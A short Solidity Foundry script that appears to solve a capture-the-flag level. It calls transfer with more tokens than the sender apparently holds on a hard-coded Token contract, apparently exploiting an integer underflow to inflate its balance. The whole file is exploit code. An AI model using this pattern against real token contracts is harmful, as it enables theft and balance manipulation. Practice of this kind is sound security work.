// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Level5.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenSolution is Script {
    Token public tokenInstance =
        Token(0xefC57D29C35FE80d03cc97116C9aFF9310E9AcdE);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        tokenInstance.transfer(address(0), 30);
        vm.stopBroadcast();
    }
}
